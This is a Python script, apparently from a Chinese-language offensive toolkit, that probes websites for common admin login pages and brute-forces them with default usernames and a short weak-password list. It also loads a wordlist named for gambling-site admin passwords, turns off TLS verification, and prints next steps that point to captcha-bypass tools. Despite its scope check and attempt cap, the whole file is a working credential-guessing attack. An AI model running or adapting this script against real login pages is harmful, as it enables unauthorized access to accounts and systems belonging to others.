#!/usr/bin/env python3
"""登录面短字典弱口探针（授权范围内）。

只打常见后台路径 + 短字典（默认 ≤ 24 次 POST）。
不跑 hydra 无限爆破、不改密、不锁号继续撞。
"""
from __future__ import annotations

import argparse
import json
import re
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from urllib.parse import urljoin

try:
    import requests

    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
ROOT = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-auth-brute"
LOGIN_PATHS = (
    "/admin/login",
    "/admin/",
    "/login",
    "/user/login",
    "/api/login",
    "/api/admin/login",
    "/manage/login",
    "/backend/login",
    "/console/login",
    "/wp-login.php",
)
DEFAULT_USERS = ("admin", "administrator", "root")
DEFAULT_PASSES = (
    "admin",
    "admin123",
    "admin888",
    "123456",
    "admin@123",
    "Admin888",
    "password",
    "12345678",
)
LOCK_RX = re.compile(r"账号(?:已)?锁定|account locked|too many attempts|尝试过多|频繁|429", re.I)
CAPTCHA_RX = re.compile(r"验证码|captcha|geetest|recaptcha|滑块", re.I)
FAIL_RX = re.compile(
    r"密码错误|账号或密码|用户名或密码|invalid password|login failed|incorrect|认证失败|登录失败",
    re.I,
)
LOGIN_HINT_RX = re.compile(r'type=["\']password["\']|name=["\']password["\']|忘记密码|用户登录', re.I)


def _req(sess: requests.Session, method: str, url: str, **kw: Any) -> requests.Response | None:
    kw.setdefault("timeout", 8)
    kw.setdefault("verify", False)
    kw.setdefault("allow_redirects", False)
    try:
        return sess.request(method, url, **kw)
    except Exception:
        return None


def _load_passes(extra: Path | None, limit: int) -> list[str]:
    out: list[str] = list(DEFAULT_PASSES)
    src = extra or (ROOT / "dict" / "gambling_admin_passwords.txt")
    if src.exists():
        for line in src.read_text(encoding="utf-8", errors="ignore").splitlines():
            s = line.strip()
            if not s or s.startswith("#"):
                continue
            if s not in out:
                out.append(s)
            if len(out) >= limit:
                break
    return out[:limit]


def _looks_login(body: str, path: str, status: int) -> bool:
    if status >= 400:
        return False
    if path.endswith("wp-login.php"):
        return "pwd" in body.lower() or "log" in body.lower()
    if path.startswith("/api/"):
        return True
    return bool(LOGIN_HINT_RX.search(body))


def _json_ok(data: Any) -> bool:
    if not isinstance(data, dict):
        return False
    msg = str(data.get("msg") or data.get("message") or data.get("error") or "")
    if FAIL_RX.search(msg):
        return False
    token = data.get("token") or data.get("access_token") or data.get("accessToken")
    if isinstance(token, str) and len(token) >= 16:
        return True
    inner = data.get("data")
    if isinstance(inner, dict):
        t2 = inner.get("token") or inner.get("access_token") or inner.get("accessToken")
        if isinstance(t2, str) and len(t2) >= 16:
            return True
    return False


def _success(r: requests.Response, body: str) -> bool:
    if LOCK_RX.search(body) or r.status_code in (401, 403, 429):
        return False
    if FAIL_RX.search(body):
        return False
    loc = r.headers.get("Location", "")
    if r.status_code in (301, 302, 303, 307) and loc and "login" not in loc.lower():
        return True
    try:
        data = r.json()
    except Exception:
        data = None
    if _json_ok(data):
        return True
    return False


def _post_variants(path: str, user: str, pwd: str) -> list[tuple[str, dict[str, Any]]]:
    if "wp-login.php" in path:
        return [("form", {"log": user, "pwd": pwd, "wp-submit": "Log In"})]
    if path.startswith("/api/"):
        return [
            ("json", {"username": user, "password": pwd}),
            ("json", {"userName": user, "password": pwd}),
            ("json", {"account": user, "password": pwd}),
        ]
    return [
        ("form", {"username": user, "password": pwd}),
        ("form", {"userName": user, "password": pwd}),
        ("json", {"username": user, "password": pwd}),
    ]


def run(base_url: str, case: str, out: Path | None, limit: int) -> dict[str, Any]:
    host = host_of(base_url)
    if host and not in_scope(host):
        print(f"[!] 不在 scope：{host}", file=sys.stderr)
        sys.exit(2)
    base = base_url.rstrip("/")
    sess = requests.Session()
    sess.verify = False
    sess.headers["User-Agent"] = UA
    passes = _load_passes(None, 16)
    login_hits: list[dict[str, Any]] = []
    cred_hits: list[dict[str, Any]] = []
    locked = False
    captcha_wall = False
    attempts = 0

    for path in LOGIN_PATHS:
        r = _req(sess, "GET", urljoin(base + "/", path.lstrip("/")), allow_redirects=True)
        if r is None:
            continue
        body = r.text or ""
        if not _looks_login(body, path, r.status_code):
            continue
        login_hits.append({"path": path, "status": r.status_code, "url": r.url})
        if CAPTCHA_RX.search(body) and not path.startswith("/api/"):
            captcha_wall = True
            continue
        final = r.url
        for user in DEFAULT_USERS[:2]:
            for pwd in passes:
                if locked or attempts >= limit or cred_hits:
                    break
                for kind, data in _post_variants(path, user, pwd):
                    if attempts >= limit or locked or cred_hits:
                        break
                    attempts += 1
                    if kind == "json":
                        pr = _req(sess, "POST", final, json=data)
                    else:
                        pr = _req(sess, "POST", final, data=data)
                    if pr is None:
                        continue
                    pb = pr.text or ""
                    if pr.status_code == 429 or LOCK_RX.search(pb):
                        locked = True
                        break
                    if _success(pr, pb):
                        cred_hits.append(
                            {
                                "family": "weak-pass",
                                "level": "L2",
                                "path": path,
                                "user": user,
                                "password": pwd,
                                "status": pr.status_code,
                            }
                        )
                        break
            if cred_hits or locked:
                break
        if cred_hits:
            break

    report: dict[str, Any] = {
        "ts": datetime.now(UTC).isoformat(),
        "target": base,
        "login_surfaces": login_hits,
        "findings": cred_hits,
        "attempts": attempts,
        "locked": locked,
        "captcha_wall": captcha_wall,
        "playbook": "传承/黑楼兰·硬撼.md",
        "skill": "杀招/黑楼兰·硬撼",
        "next": [
            "L2 弱口 → 立刻填对象矩阵，禁止只登自己后台结案",
            "captcha_wall → captcha-ocr / geetest-captcha-bypass",
            "锁号 → 停撞，写复工条件",
            "PMA/宝塔面 → panel_surface_probe（本卡不代打面板）",
        ],
    }
    out_path = write_probe_json(
        report, case=case, out=out, case_subdir="auth_brute", filename="probe.json"
    )
    print(
        json.dumps(
            {
                "logins": len(login_hits),
                "weak": len(cred_hits),
                "attempts": attempts,
                "locked": locked,
                "captcha_wall": captcha_wall,
                "out": str(out_path),
            },
            ensure_ascii=False,
        )
    )
    return report


def main() -> None:
    ap = argparse.ArgumentParser(description="登录面短字典弱口探针")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--case", default="")
    ap.add_argument("--out", type=Path, default=None)
    ap.add_argument("--limit", type=int, default=24, help="最大 POST 次数")
    args = ap.parse_args()
    run(args.url, args.case, args.out, args.limit)


if __name__ == "__main__":
    main()
